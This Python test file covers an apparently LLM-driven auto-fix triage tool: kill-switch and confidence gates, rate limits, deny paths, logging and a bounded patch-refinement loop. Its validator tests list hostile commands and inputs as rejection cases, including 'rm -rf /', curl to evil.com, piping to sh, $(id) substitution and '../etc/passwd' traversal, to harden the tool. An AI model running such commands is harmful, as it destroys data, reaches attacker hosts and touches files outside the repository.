# CUI // SP-CTI
"""Unit tests for tools/workflow/failure_triage.py.

Covers the pure-Python decision logic: dedup markers, rate budget, the
should_auto_apply gate chain, and the LLM routing fallback.  The DB
query and actual LLM invocations are mocked.
"""
from __future__ import annotations

import time

import pytest


@pytest.fixture
def ft(monkeypatch, tmp_path):
    """Import failure_triage with temp dirs + env reset."""
    from tools.workflow import failure_triage as ft_mod

    # Redirect file-backed state into the pytest tmpdir
    monkeypatch.setattr(ft_mod, "TRIAGED_DIR", tmp_path / "triaged")
    monkeypatch.setattr(ft_mod, "RATE_FILE", tmp_path / "rate.json")
    monkeypatch.delenv(ft_mod.AUTOFIX_ENV, raising=False)
    return ft_mod


# ---------------------------------------------------------------------------
# dedup markers
# ---------------------------------------------------------------------------

class TestDedup:
    def test_not_triaged_by_default(self, ft):
        assert ft.already_triaged("t1", "sig1") is False

    def test_mark_then_detect(self, ft):
        ft.mark_triaged("t1", "sig1", {"outcome": "test"})
        assert ft.already_triaged("t1", "sig1") is True

    def test_different_signature_not_deduped(self, ft):
        ft.mark_triaged("t1", "sigA", {"outcome": "test"})
        assert ft.already_triaged("t1", "sigB") is False


# ---------------------------------------------------------------------------
# rate budget
# ---------------------------------------------------------------------------

class TestRateBudget:
    def test_empty_log_allows_apply(self, ft):
        ok, count = ft.within_rate_budget()
        assert ok is True
        assert count == 0

    def test_cap_blocks_after_max(self, ft):
        # Record the max applies within the last hour
        now = time.time()
        for i in range(ft.MAX_APPLIES_PER_HOUR):
            ft.record_apply(ts=now - i * 10)
        ok, count = ft.within_rate_budget()
        assert ok is False
        assert count == ft.MAX_APPLIES_PER_HOUR

    def test_old_entries_dont_count(self, ft):
        # 2 hours ago — outside the rolling window
        ft.record_apply(ts=time.time() - 7200)
        ok, count = ft.within_rate_budget()
        assert ok is True
        assert count == 0


# ---------------------------------------------------------------------------
# should_auto_apply gate chain
# ---------------------------------------------------------------------------

class TestAutoApplyGates:
    def _task(self, **overrides):
        base = {
            "id": "t-auto",
            "title": "fix a bug",
            "description": "regular build task",
            "task_type": "fix",
            "last_failure_reason": "AttributeError: typo",
        }
        base.update(overrides)
        return base

    def _diag(self, **overrides):
        base = {
            "root_cause": "missing attribute",
            "recommendation": "patch",
            "patch_hint": "rename _x to x",
            "suspect_files": ["tools/foo.py:42"],
            "confidence": 0.95,
        }
        base.update(overrides)
        return base

    def test_kill_switch_off_blocks(self, ft):
        allow, reason = ft.should_auto_apply(self._task(), self._diag())
        assert allow is False
        assert "AUTOFIX_ENABLED" in reason

    def test_kill_switch_on_and_gates_green(self, ft, monkeypatch):
        monkeypatch.setenv(ft.AUTOFIX_ENV, "true")
        allow, reason = ft.should_auto_apply(self._task(), self._diag())
        assert allow is True, reason

    def test_recommendation_quarantine_blocks(self, ft, monkeypatch):
        monkeypatch.setenv(ft.AUTOFIX_ENV, "true")
        allow, reason = ft.should_auto_apply(self._task(), self._diag(recommendation="quarantine"))
        assert allow is False
        assert "'patch'" in reason

    def test_low_confidence_blocks(self, ft, monkeypatch):
        monkeypatch.setenv(ft.AUTOFIX_ENV, "true")
        allow, reason = ft.should_auto_apply(self._task(), self._diag(confidence=0.5))
        assert allow is False
        assert "confidence" in reason

    def test_task_type_not_in_whitelist_blocks(self, ft, monkeypatch):
        monkeypatch.setenv(ft.AUTOFIX_ENV, "true")
        allow, reason = ft.should_auto_apply(
            self._task(task_type="deploy"), self._diag(),
        )
        assert allow is False
        assert "task_type" in reason

    def test_deny_token_in_description_blocks(self, ft, monkeypatch):
        monkeypatch.setenv(ft.AUTOFIX_ENV, "true")
        allow, reason = ft.should_auto_apply(
            self._task(description="apply migration 017"), self._diag(),
        )
        assert allow is False
        assert "deny-token" in reason

    def test_deny_file_prefix_blocks(self, ft, monkeypatch):
        monkeypatch.setenv(ft.AUTOFIX_ENV, "true")
        allow, reason = ft.should_auto_apply(
            self._task(),
            self._diag(suspect_files=["tools/db/migrations/017_foo.sql"]),
        )
        assert allow is False
        assert "deny-path" in reason

    def test_rate_limit_blocks(self, ft, monkeypatch):
        monkeypatch.setenv(ft.AUTOFIX_ENV, "true")
        now = time.time()
        for i in range(ft.MAX_APPLIES_PER_HOUR):
            ft.record_apply(ts=now - i)
        allow, reason = ft.should_auto_apply(self._task(), self._diag())
        assert allow is False
        assert "rate limit" in reason

    def test_gates_applied_in_stable_order(self, ft, monkeypatch):
        """Kill switch is always checked first — env-off short-circuits
        even if other gates would also fail."""
        # env unset → block even though the diag is obviously bad
        allow, reason = ft.should_auto_apply(
            self._task(task_type="deploy"),
            self._diag(recommendation="quarantine", confidence=0.1),
        )
        assert allow is False
        assert "AUTOFIX_ENABLED" in reason


# ---------------------------------------------------------------------------
# diagnose_task — LLM routing fallback
# ---------------------------------------------------------------------------

class TestDiagnoseFallback:
    def test_llm_unavailable_falls_back_to_self_debug(self, ft, monkeypatch):
        """When the thinking-tier LLM raises LLMUnavailableError, we MUST
        fall back to the deterministic self_debug.diagnose heuristic."""
        from tools.workflow import self_debug

        # Stub self_debug.snapshot so we don't touch git.
        monkeypatch.setattr(
            self_debug, "snapshot",
            lambda task_id, cwd, reason: {"reason": reason, "task_id": task_id},
        )
        # Stub self_debug.diagnose so we can assert it was called.
        called = {}
        def fake_diag(snap):
            called["yes"] = True
            return {"root_cause": "fallback", "recommendation": "quarantine",
                    "confidence": 0.4, "_source": "heuristic"}
        monkeypatch.setattr(self_debug, "diagnose", fake_diag)

        # Stub the LLM path to raise LLMUnavailableError.
        import tools.llm.router as router_mod
        class _Unavailable(router_mod.LLMUnavailableError):
            pass
        def boom(self, function, request):
            raise router_mod.LLMUnavailableError(
                "no provider", function=function, chain=[], no_llm_mode=False,
            )
        monkeypatch.setattr(router_mod.LLMRouter, "invoke", boom)

        diag = ft.diagnose_task(
            {"id": "t1", "title": "x", "description": "",
             "task_type": "fix", "last_failure_reason": "boom"},
        )
        assert called.get("yes") is True
        assert diag["_source"] == "heuristic"
        assert diag["root_cause"] == "fallback"


# ---------------------------------------------------------------------------
# triage_once — end-to-end with mocked DB + diagnosis
# ---------------------------------------------------------------------------

class TestTriageOnce:
    def test_no_failures_returns_empty(self, ft, monkeypatch):
        monkeypatch.setattr(ft, "find_recent_failures", lambda **k: [])
        summary = ft.triage_once(apply=False)
        assert summary["failures_scanned"] == 0
        assert summary["results"] == []

    def test_already_triaged_is_skipped(self, ft, monkeypatch):
        task = {
            "id": "t-skip", "title": "t", "description": "",
            "task_type": "fix", "last_failure_reason": "x",
        }
        monkeypatch.setattr(ft, "find_recent_failures", lambda **k: [task])
        sig = ft._sig("x")
        ft.mark_triaged("t-skip", sig, {"prior": True})
        # diagnosis should not be called
        def boom(_t):
            raise AssertionError("should not diagnose a deduped task")
        monkeypatch.setattr(ft, "diagnose_task", boom)
        summary = ft.triage_once(apply=False)
        assert summary["results"][0]["outcome"] == "skipped_already_triaged"

    def test_low_confidence_creates_suggested_card(self, ft, monkeypatch):
        task = {
            "id": "t-low", "title": "t", "description": "",
            "task_type": "fix", "last_failure_reason": "y",
        }
        monkeypatch.setattr(ft, "find_recent_failures", lambda **k: [task])
        monkeypatch.setattr(ft, "diagnose_task", lambda t: {
            "root_cause": "unclear", "recommendation": "quarantine",
            "confidence": 0.4, "_source": "heuristic",
        })
        calls = []
        monkeypatch.setattr(ft, "_create_diagnostic_card",
                            lambda t, d: calls.append(("card", t["id"])) or "diag-xyz")
        summary = ft.triage_once(apply=True)
        assert summary["results"][0]["outcome"] == "suggested_card_created"
        assert calls == [("card", "t-low")]

    def test_apply_calls_worktree_stage_when_gates_green(self, ft, monkeypatch):
        """With env on, apply=True, high confidence, and a valid patch the
        triage loop MUST call apply_patch_in_worktree (not just print)."""
        monkeypatch.setenv(ft.AUTOFIX_ENV, "true")
        task = {
            "id": "t-go", "title": "t", "description": "regular task",
            "task_type": "fix", "last_failure_reason": "AttributeError: _x",
        }
        monkeypatch.setattr(ft, "find_recent_failures", lambda **k: [task])
        monkeypatch.setattr(ft, "diagnose_task", lambda t: {
            "root_cause": "typo", "recommendation": "patch",
            "confidence": 0.95, "suspect_files": ["tools/foo.py"],
            "_source": "llm",
        })
        monkeypatch.setattr(ft, "generate_patch", lambda t, d: {
            "files": [{"path": "tools/foo.py", "old_string": "old", "new_string": "new"}],
            "verification_command": "python -m pytest tests/test_foo.py",
        })
        seen = {}
        monkeypatch.setattr(ft, "apply_patch_in_worktree",
                            lambda t, d, p: seen.setdefault("called", (t, d, p)) and None
                            or {"applied": True, "outcome": "applied_verified_committed"})
        monkeypatch.setattr(ft, "_create_diagnostic_card_with_patch", lambda t, d, p: "diag-xyz")
        summary = ft.triage_once(apply=True)
        assert "called" in seen
        assert summary["results"][0]["outcome"] == "applied_verified_committed"

    def test_apply_without_env_stays_on_suggested_path(self, ft, monkeypatch):
        """Even with apply=True, kill-switch env off means no patch gen."""
        monkeypatch.delenv(ft.AUTOFIX_ENV, raising=False)
        task = {
            "id": "t-hi", "title": "t", "description": "",
            "task_type": "fix", "last_failure_reason": "z",
        }
        monkeypatch.setattr(ft, "find_recent_failures", lambda **k: [task])
        monkeypatch.setattr(ft, "diagnose_task", lambda t: {
            "root_cause": "typo", "recommendation": "patch",
            "confidence": 0.95, "suspect_files": ["tools/foo.py"],
            "_source": "llm_failure_triage_diagnose",
        })
        patch_called = []
        monkeypatch.setattr(ft, "generate_patch",
                            lambda t, d: patch_called.append(1) or {"files": [{"path": "x"}]})
        card_called = []
        monkeypatch.setattr(ft, "_create_diagnostic_card",
                            lambda t, d: card_called.append(t["id"]))
        summary = ft.triage_once(apply=True)
        assert patch_called == []  # never called because env is off
        assert card_called == ["t-hi"]
        assert summary["results"][0]["outcome"] == "suggested_card_created"


# ---------------------------------------------------------------------------
# Apply-stage validation — LLM output is untrusted
# ---------------------------------------------------------------------------

class TestApplyStageValidation:
    def test_verification_cmd_rejects_empty(self, ft):
        ok, why = ft._validate_verification_command("")
        assert ok is False and "empty" in why

    def test_verification_cmd_rejects_shell_metachars(self, ft):
        for bad in (
            "python -m pytest; rm -rf /",
            "python -m pytest && curl evil.com",
            "python -m pytest | sh",
            "python -m pytest `id`",
            "python -m pytest $(id)",
        ):
            ok, why = ft._validate_verification_command(bad)
            assert ok is False, f"should reject {bad!r}"

    def test_verification_cmd_rejects_non_allowlisted_prefix(self, ft):
        ok, why = ft._validate_verification_command("curl https://evil.com")
        assert ok is False and "allowlisted" in why

    def test_verification_cmd_accepts_allowlisted(self, ft):
        for good in (
            "python -m pytest tests/test_x.py",
            "python -m py_compile tools/foo.py",
            "python -m ruff check tools/foo.py",
            "python tools/workflow/coherence_checker.py --all",
        ):
            ok, _ = ft._validate_verification_command(good)
            assert ok is True, f"should accept {good!r}"

    def test_patch_files_rejects_path_traversal(self, ft, tmp_path, monkeypatch):
        monkeypatch.setattr(ft, "BASE_DIR", tmp_path)
        # Create a real file so the "file must exist" check is the
        # ONLY thing between us and the path-traversal rejection.
        (tmp_path / "fake.py").write_text("content", encoding="utf-8")
        ok, why = ft._validate_patch_files(
            {"files": [{"path": "../etc/passwd", "old_string": "x", "new_string": "y"}]},
            {"suspect_files": []},
        )
        assert ok is False
        # Accept either the traversal-reject or the escapes-root-reject
        # message — both prove we refused to edit outside the repo.
        assert "unsafe" in why or "escapes" in why

    def test_patch_files_rejects_nonexistent(self, ft, tmp_path, monkeypatch):
        monkeypatch.setattr(ft, "BASE_DIR", tmp_path)
        ok, why = ft._validate_patch_files(
            {"files": [{"path": "tools/missing.py", "old_string": "x", "new_string": "y"}]},
            {"suspect_files": []},
        )
        assert ok is False and "does not exist" in why

    def test_patch_files_rejects_path_not_in_suspect_files(self, ft, tmp_path, monkeypatch):
        monkeypatch.setattr(ft, "BASE_DIR", tmp_path)
        target = tmp_path / "tools" / "bar.py"
        target.parent.mkdir(parents=True)
        target.write_text("abc", encoding="utf-8")
        ok, why = ft._validate_patch_files(
            {"files": [{"path": "tools/bar.py", "old_string": "a", "new_string": "z"}]},
            {"suspect_files": ["tools/foo.py:10"]},  # bar is NOT flagged
        )
        assert ok is False and "not in diag.suspect_files" in why

    def test_patch_files_rejects_nonunique_old_string(self, ft, tmp_path, monkeypatch):
        monkeypatch.setattr(ft, "BASE_DIR", tmp_path)
        target = tmp_path / "tools" / "foo.py"
        target.parent.mkdir(parents=True)
        target.write_text("x = 1\nx = 2\n", encoding="utf-8")  # "x =" appears twice
        ok, why = ft._validate_patch_files(
            {"files": [{"path": "tools/foo.py", "old_string": "x =", "new_string": "y ="}]},
            {"suspect_files": ["tools/foo.py"]},
        )
        assert ok is False and "not unique" in why

    def test_patch_files_rejects_deny_prefix(self, ft, tmp_path, monkeypatch):
        monkeypatch.setattr(ft, "BASE_DIR", tmp_path)
        target = tmp_path / "tools" / "db" / "migrations" / "017.sql"
        target.parent.mkdir(parents=True)
        target.write_text("CREATE TABLE x;", encoding="utf-8")
        ok, why = ft._validate_patch_files(
            {"files": [{"path": "tools/db/migrations/017.sql",
                        "old_string": "CREATE", "new_string": "DROP"}]},
            {"suspect_files": ["tools/db/migrations/017.sql"]},
        )
        assert ok is False and "deny-path" in why

    def test_patch_files_accepts_valid_patch(self, ft, tmp_path, monkeypatch):
        monkeypatch.setattr(ft, "BASE_DIR", tmp_path)
        target = tmp_path / "tools" / "foo.py"
        target.parent.mkdir(parents=True)
        target.write_text("def foo(): return 1", encoding="utf-8")
        ok, why = ft._validate_patch_files(
            {"files": [{"path": "tools/foo.py",
                        "old_string": "return 1", "new_string": "return 2"}]},
            {"suspect_files": ["tools/foo.py:1"]},
        )
        assert ok is True, why


# ---------------------------------------------------------------------------
# Apply-stage rejection paths (no real worktree — asserts early returns)
# ---------------------------------------------------------------------------

class TestApplyPatchRejections:
    def test_rejects_on_bad_verification_cmd(self, ft, monkeypatch, tmp_path):
        monkeypatch.setattr(ft, "AUDIT_DIR", tmp_path / "audit")
        # record_apply MUST NOT be called when validation fails before apply
        counted = []
        monkeypatch.setattr(ft, "record_apply",
                            lambda ts=None: counted.append(1))
        monkeypatch.setattr(ft, "_create_autofix_worktree",
                            lambda *a, **k: (_ for _ in ()).throw(
                                AssertionError("should not create worktree on validation fail")
                            ))
        result = ft.apply_patch_in_worktree(
            {"id": "t-bad", "last_failure_reason": "x"},
            {"suspect_files": ["tools/foo.py"]},
            {"files": [{"path": "tools/foo.py", "old_string": "a", "new_string": "b"}],
             "verification_command": "rm -rf /"},
        )
        assert result["applied"] is False
        assert result["outcome"] == "rejected_bad_verification_command"
        assert counted == []  # budget not consumed

    def test_rejects_on_bad_patch_files(self, ft, monkeypatch, tmp_path):
        monkeypatch.setattr(ft, "AUDIT_DIR", tmp_path / "audit")
        counted = []
        monkeypatch.setattr(ft, "record_apply",
                            lambda ts=None: counted.append(1))
        result = ft.apply_patch_in_worktree(
            {"id": "t-bad2", "last_failure_reason": "x"},
            {"suspect_files": []},  # LLM didn't flag any file
            {"files": [{"path": "tools/foo.py", "old_string": "a", "new_string": "b"}],
             "verification_command": "python -m pytest tests/"},
        )
        assert result["applied"] is False
        assert result["outcome"] == "rejected_bad_patch_files"
        assert counted == []


# ---------------------------------------------------------------------------
# Automerge is off by default — safety invariant
# ---------------------------------------------------------------------------

class TestAutomergeSwitch:
    def test_automerge_env_off_by_default(self, ft, monkeypatch):
        monkeypatch.delenv(ft.AUTOMERGE_ENV, raising=False)
        assert ft.automerge_enabled() is False

    def test_automerge_env_on(self, ft, monkeypatch):
        monkeypatch.setenv(ft.AUTOMERGE_ENV, "true")
        assert ft.automerge_enabled() is True


# ---------------------------------------------------------------------------
# Structured NDJSON recovery events (WS3.2 / arc-obs-02)
# ---------------------------------------------------------------------------

class TestStructuredEvents:
    """Each triage decision emits a structured event via get_logger that
    lands in .logs/ now and flows to centralized_logs once log_ingest lands.
    We capture the underlying logger calls instead of touching the filesystem.
    """

    @pytest.fixture
    def captured(self, ft, monkeypatch):
        """Capture every (level, event_type, payload) passed to _events.log."""
        events = []

        def fake_log(level, msg, *args, **kwargs):
            payload = (kwargs.get("extra") or {}).get("extra", {})
            events.append((level, msg, payload))

        monkeypatch.setattr(ft._events, "log", fake_log)
        return events

    def test_emit_event_drops_none_fields(self, ft, captured):
        ft._emit_event(
            "diagnosis_made", task_id="t1", signature="sig1",
            confidence=0.9, recommendation=None,
        )
        assert len(captured) == 1
        _level, msg, payload = captured[0]
        assert msg == "diagnosis_made"
        assert payload["event_type"] == "diagnosis_made"
        assert payload["task_id"] == "t1"
        assert payload["signature"] == "sig1"
        assert payload["confidence"] == 0.9
        assert "recommendation" not in payload  # None dropped

    def test_emit_event_never_raises(self, ft, monkeypatch):
        def boom(*a, **k):
            raise RuntimeError("logging exploded")
        monkeypatch.setattr(ft._events, "log", boom)
        # Must swallow — logging cannot break the triage pipeline.
        ft._emit_event("gate_decision", task_id="t", signature="s")

    def test_suggested_card_path_emits_diagnosis_gate_and_outcome(self, ft, monkeypatch, captured):
        task = {
            "id": "t-ev", "title": "t", "description": "",
            "task_type": "fix", "last_failure_reason": "boom",
        }
        monkeypatch.setattr(ft, "find_recent_failures", lambda **k: [task])
        monkeypatch.setattr(ft, "diagnose_task", lambda t: {
            "root_cause": "unclear", "recommendation": "quarantine",
            "confidence": 0.4, "_source": "heuristic",
        })
        monkeypatch.setattr(ft, "_create_diagnostic_card", lambda t, d: "diag-1")

        ft.triage_once(apply=True)

        types = [p["event_type"] for (_l, _m, p) in captured]
        assert types == ["diagnosis_made", "gate_decision", "apply_outcome"]
        outcome_evt = captured[-1][2]
        assert outcome_evt["outcome"] == "suggested_card_created"
        assert outcome_evt["task_id"] == "t-ev"
        assert outcome_evt["signature"] == ft._sig("boom")

    def test_apply_path_emits_full_event_sequence(self, ft, monkeypatch, captured):
        monkeypatch.setenv(ft.AUTOFIX_ENV, "true")
        task = {
            "id": "t-go", "title": "t", "description": "regular task",
            "task_type": "fix", "last_failure_reason": "AttributeError: _x",
        }
        monkeypatch.setattr(ft, "find_recent_failures", lambda **k: [task])
        monkeypatch.setattr(ft, "diagnose_task", lambda t: {
            "root_cause": "typo", "recommendation": "patch",
            "confidence": 0.95, "suspect_files": ["tools/foo.py"], "_source": "llm",
        })
        monkeypatch.setattr(ft, "generate_patch", lambda t, d: {
            "files": [{"path": "tools/foo.py", "old_string": "old", "new_string": "new"}],
            "verification_command": "python -m pytest tests/test_foo.py",
        })
        monkeypatch.setattr(ft, "apply_patch_in_worktree",
                            lambda t, d, p: {"applied": True, "outcome": "applied_verified_committed"})
        monkeypatch.setattr(ft, "_create_diagnostic_card_with_patch", lambda t, d, p: "diag-1")

        ft.triage_once(apply=True)

        types = [p["event_type"] for (_l, _m, p) in captured]
        # apply_patch_in_worktree is mocked so verify_result fires inside it
        # only in the real path; here we assert the orchestrator-level events.
        assert types == ["diagnosis_made", "gate_decision", "patch_generated", "apply_outcome"]
        patch_evt = next(p for (_l, _m, p) in captured if p["event_type"] == "patch_generated")
        assert patch_evt["generated"] is True
        assert patch_evt["files"] == ["tools/foo.py"]

    def test_verify_result_emitted_in_worktree_on_failure(self, ft, monkeypatch, tmp_path, captured):
        """apply_patch_in_worktree emits verify_result with the rc/outcome."""
        monkeypatch.setattr(ft, "AUDIT_DIR", tmp_path / "audit")
        monkeypatch.setattr(ft, "record_apply", lambda ts=None: None)
        monkeypatch.setattr(ft, "_create_autofix_worktree",
                            lambda tid, sig: (tmp_path / "wt", "autofix/x"))
        # Make the file edit a no-op and force verification to fail (rc=1).
        (tmp_path / "wt").mkdir(parents=True)
        monkeypatch.setattr(ft, "_run", lambda *a, **k: (1, "boom"))
        monkeypatch.setattr(ft, "_cleanup_autofix_worktree", lambda *a, **k: None)
        monkeypatch.setattr(ft, "_validate_verification_command", lambda c: (True, "ok"))
        monkeypatch.setattr(ft, "_validate_patch_files", lambda p, d: (True, "ok"))

        # Patch file edit: the loop reads/writes via Path — stub the file.
        target = tmp_path / "wt" / "tools" / "foo.py"
        target.parent.mkdir(parents=True)
        target.write_text("old", encoding="utf-8")

        ft.apply_patch_in_worktree(
            {"id": "t-vf", "last_failure_reason": "x", "title": "t"},
            {"suspect_files": ["tools/foo.py"], "confidence": 0.9, "recommendation": "patch"},
            {"files": [{"path": "tools/foo.py", "old_string": "old", "new_string": "new"}],
             "verification_command": "python -m pytest tests/test_foo.py"},
        )

        verify_evts = [p for (_l, _m, p) in captured if p["event_type"] == "verify_result"]
        assert len(verify_evts) == 1
        assert verify_evts[0]["verification_rc"] == 1
        assert verify_evts[0]["passed"] is False
        assert verify_evts[0]["outcome"] == "verify_failed"


# ---------------------------------------------------------------------------
# ReAct-loop helpers (WS2.3 / arc-dbg-02)
# ---------------------------------------------------------------------------

class TestReactHelpers:
    """Pure-function helpers around the bounded ReAct loop. No LLM, no
    real worktree, no git — every test stubs the LLM and the worktree.
    """

    def test_estimate_tokens_floor(self, ft):
        assert ft._react_estimate_tokens("") == 1
        assert ft._react_estimate_tokens("abcd") == 1  # 4 chars / 4
        assert ft._react_estimate_tokens("a" * 40) == 10

    def test_snapshot_and_restore_round_trip(self, ft, tmp_path):
        wt = tmp_path / "wt"
        wt.mkdir()
        (wt / "tools").mkdir()
        (wt / "tools" / "foo.py").write_text("original", encoding="utf-8")
        snap = ft._react_snapshot_files(wt, ["tools/foo.py"])
        assert snap == {"tools/foo.py": "original"}

        # Edit then restore
        (wt / "tools" / "foo.py").write_text("changed", encoding="utf-8")
        ft._react_restore_files(wt, snap)
        assert (wt / "tools" / "foo.py").read_text(encoding="utf-8") == "original"

    def test_apply_files_edits_unique_old_string(self, ft, tmp_path):
        wt = tmp_path / "wt"
        wt.mkdir()
        (wt / "tools").mkdir()
        (wt / "tools" / "foo.py").write_text(
            "def foo():\n    return 1\n", encoding="utf-8",
        )
        applied = ft._react_apply_files(
            wt,
            [{"path": "tools/foo.py", "old_string": "return 1", "new_string": "return 2"}],
        )
        assert applied == ["tools/foo.py"]
        assert "return 2" in (wt / "tools" / "foo.py").read_text(encoding="utf-8")

    def test_fingerprint_ignores_transient_noise(self, ft):
        a = {
            "verification_rc": 1,
            "error_excerpt": "AttributeError: 'NoneType' has no attribute 'x'",
            "failing_test": "tests/test_foo.py::test_bar",
        }
        b = dict(a)
        # Same structural bits → same fingerprint
        assert ft._react_fingerprint(a) == ft._react_fingerprint(b)
        # Different rc → different
        c = dict(a, verification_rc=2)
        assert ft._react_fingerprint(a) != ft._react_fingerprint(c)
        # Different error excerpt → different
        d = dict(a, error_excerpt="KeyError: nope")
        assert ft._react_fingerprint(a) != ft._react_fingerprint(d)

    def test_extract_failure_hint_picks_known_patterns(self, ft):
        out = (
            "============================= test session starts =============================\n"
            "FAILED tests/test_foo.py::test_bar - AttributeError: 'NoneType' has no attribute 'x'\n"
            "E       AttributeError: 'NoneType' has no attribute 'x'\n"
            "=========================== short test summary info ============================\n"
        )
        err, fail = ft._react_extract_failure_hint(out)
        assert err and "AttributeError" in err
        assert fail and "tests/test_foo.py::test_bar" in fail

    def test_extract_failure_hint_returns_none_on_garbage(self, ft):
        assert ft._react_extract_failure_hint("") == (None, None)
        assert ft._react_extract_failure_hint("all good") == (None, None)

    def test_history_compact_is_single_line_per_iteration(self, ft):
        history = [
            {
                "iteration": 1, "verification_rc": 1,
                "error_excerpt": "boom", "failing_test": "t::x",
                "applied_files": ["tools/a.py"],
            },
            {
                "iteration": 2, "verification_rc": 0,
                "error_excerpt": "", "failing_test": "",
                "applied_files": ["tools/a.py"],
            },
        ]
        block = ft._react_history_compact(history)
        # One line per iteration
        assert block.count("\n") == 1
        assert "[i=1]" in block and "[i=2]" in block
        assert "rc=1" in block and "rc=0" in block

    def test_no_progress_returns_false_below_window(self, ft):
        history = [
            {"verification_rc": 1, "error_excerpt": "a", "failing_test": "x"},
        ]
        assert ft._react_no_progress(history) is False

    def test_no_progress_returns_true_when_last_n_match(self, ft):
        # Build history whose last REACT_NO_PROGRESS_WINDOW items share a fingerprint
        win = ft.REACT_NO_PROGRESS_WINDOW
        history = [
            {"verification_rc": 1, "error_excerpt": "other", "failing_test": "y"},
        ] * 3
        # Then make the most recent N identical
        for i in range(win):
            history.append({
                "verification_rc": 1,
                "error_excerpt": "same error",
                "failing_test": "t::same",
            })
        assert ft._react_no_progress(history) is True

    def test_refine_patch_returns_none_when_llm_fails(self, ft, monkeypatch):
        """When the LLM is unavailable, the loop MUST degrade to
        'refine_unavailable' (or other non-fixed outcome) — never raise."""
        import tools.llm.router as router_mod
        def boom(self, function, request):
            raise router_mod.LLMUnavailableError(
                "no provider", function=function, chain=[], no_llm_mode=False,
            )
        monkeypatch.setattr(router_mod.LLMRouter, "invoke", boom)

        result = ft._react_refine_patch(
            {"id": "t", "title": "t", "last_failure_reason": "x"},
            {"suspect_files": []},
            history=[{"iteration": 1, "verification_rc": 1, "error_excerpt": "e"}],
        )
        assert result is None

    def test_iterate_terminates_on_first_pass(self, ft, monkeypatch, tmp_path):
        """Verify pass on the initial patch → outcome=fixed, iterations=1,
        no refinement request to the LLM."""
        # Worktree stub: a real dir we can read/write
        wt = tmp_path / "wt"
        wt.mkdir()
        (wt / "tools").mkdir()
        target = wt / "tools" / "foo.py"
        target.write_text("return 1", encoding="utf-8")

        # _run returns rc=0 (verify passes)
        monkeypatch.setattr(ft, "_run", lambda cmd, cwd, timeout=60: (0, "ok"))
        # No LLM refinement should be needed
        refine_called = []
        monkeypatch.setattr(
            ft, "_react_refine_patch",
            lambda *a, **k: refine_called.append(1) or None,
        )

        result = ft._react_iterate(
            {"id": "t-fix", "title": "x", "last_failure_reason": "boom"},
            {"suspect_files": ["tools/foo.py"]},
            {"files": [{"path": "tools/foo.py", "old_string": "return 1",
                        "new_string": "return 2"}],
             "verification_command": "python -m pytest tests/test_foo.py"},
            wt, "autofix/x", "sig-abc",
        )
        assert result["outcome"] == "fixed"
        assert result["iterations"] == 1
        assert result["verification_rc"] == 0
        assert refine_called == []  # never asked LLM to refine

    def test_iterate_terminates_on_no_progress(self, ft, monkeypatch, tmp_path):
        """When the last N observations share a fingerprint, the loop
        MUST stop (no_progress) instead of asking the LLM for another
        refinement that won't help."""
        wt = tmp_path / "wt"
        wt.mkdir()
        (wt / "tools").mkdir()
        (wt / "tools" / "foo.py").write_text("a", encoding="utf-8")

        # Force verify to always fail with the SAME error and same
        # failing test → fingerprint collision
        monkeypatch.setattr(
            ft, "_run",
            lambda cmd, cwd, timeout=60: (1, "E AttributeError: same\nFAILED t::x\n"),
        )
        refine_called = []
        # The stub must return a VALID refined patch on the first call
        # so the loop actually enters a second iteration where the
        # no_progress fingerprint can fire. Returning None would short-
        # circuit on ``refine_unavailable`` before the second iter.
        def _fake_refine(*a, **k):
            refine_called.append(1)
            return {"files": [{"path": "tools/foo.py", "old_string": "a", "new_string": "b"}],
                    "verification_command": "python -m pytest tests/test_foo.py"}

        monkeypatch.setattr(ft, "_react_refine_patch", _fake_refine)

        result = ft._react_iterate(
            {"id": "t-loop", "title": "x", "last_failure_reason": "boom"},
            {"suspect_files": ["tools/foo.py"]},
            {"files": [{"path": "tools/foo.py", "old_string": "a", "new_string": "b"}],
             "verification_command": "python -m pytest tests/test_foo.py"},
            wt, "autofix/x", "sig-abc",
            max_iterations=5,
        )
        # With REACT_NO_PROGRESS_WINDOW=2 the loop has 2 matching
        # observations in history (one from each failed iter) and
        # terminates with no_progress BEFORE spending another LLM call.
        assert result["outcome"] == "no_progress"
        assert result["iterations"] == ft.REACT_NO_PROGRESS_WINDOW
        # The LLM refine call was made once (on the first failing iter,
        # when we had only 1 history item and couldn't yet conclude
        # no_progress). On the second failing iter, the no_progress
        # check fires first and the LLM is NOT consulted again.
        assert len(refine_called) == 1

    def test_iterate_terminates_on_max_iterations(self, ft, monkeypatch, tmp_path):
        """When verify keeps failing with different fingerprints and the
        LLM keeps returning a refined patch, the loop MUST stop at
        max_iterations."""
        wt = tmp_path / "wt"
        wt.mkdir()
        (wt / "tools").mkdir()
        (wt / "tools" / "foo.py").write_text("a", encoding="utf-8")

        # Vary the failing test per call so fingerprints never collide
        call_count = {"n": 0}

        def varying_run(cmd, cwd, timeout=60):
            call_count["n"] += 1
            return (1, f"E boom{call_count['n']}\nFAILED t::test{call_count['n']}\n")
        monkeypatch.setattr(ft, "_run", varying_run)

        # Refinement always returns a (slightly-different) patch
        def fake_refine(task, diag, history):
            i = len(history) + 1
            return {
                "files": [{"path": "tools/foo.py",
                           "old_string": "a",
                           "new_string": f"a{'_' * i}"}],
                "verification_command": "python -m pytest tests/test_foo.py",
            }
        monkeypatch.setattr(ft, "_react_refine_patch", fake_refine)

        result = ft._react_iterate(
            {"id": "t-cap", "title": "x", "last_failure_reason": "boom"},
            {"suspect_files": ["tools/foo.py"]},
            {"files": [{"path": "tools/foo.py", "old_string": "a", "new_string": "a1"}],
             "verification_command": "python -m pytest tests/test_foo.py"},
            wt, "autofix/x", "sig-abc",
            max_iterations=3,
        )
        assert result["outcome"] == "max_iterations"
        assert result["iterations"] == 3

    def test_iterate_terminates_on_budget_exhaustion(self, ft, monkeypatch, tmp_path):
        """A tiny token budget MUST force early termination with
        budget_exhausted even if max_iterations is large."""
        wt = tmp_path / "wt"
        wt.mkdir()
        (wt / "tools").mkdir()
        (wt / "tools" / "foo.py").write_text("a", encoding="utf-8")

        # Verify always fails with a different fingerprint
        counter = {"n": 0}

        def varying_run(cmd, cwd, timeout=60):
            counter["n"] += 1
            return (1, f"E boom{counter['n']}\nFAILED t::test{counter['n']}\n")
        monkeypatch.setattr(ft, "_run", varying_run)

        # Refinement always returns a new patch
        monkeypatch.setattr(
            ft, "_react_refine_patch",
            lambda *a, **k: {"files": [{"path": "tools/foo.py",
                                        "old_string": "a", "new_string": "b"}],
                             "verification_command": "python -m pytest tests/"},
        )

